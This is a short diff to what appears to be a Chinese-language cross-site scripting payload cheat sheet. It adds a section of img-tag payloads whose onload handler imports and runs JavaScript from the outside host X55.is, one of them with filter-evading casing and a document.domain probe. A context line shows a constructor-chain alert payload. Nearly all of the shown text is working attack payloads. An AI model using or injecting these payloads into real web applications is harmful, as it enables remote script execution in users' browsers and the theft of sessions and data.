@@ -44,6 +44,15 @@ B["constructor"]["constructor"]("alert(1)")();
 
 
 
+## 执行弹框的方法
+
+```
+<Img Src=//X55.is OnLoad=import(src)>
+<Img+Src=//X55.is+OnLoad=import(src)>#confirm(document.domain)//
+```
+
+
+
 
 
 
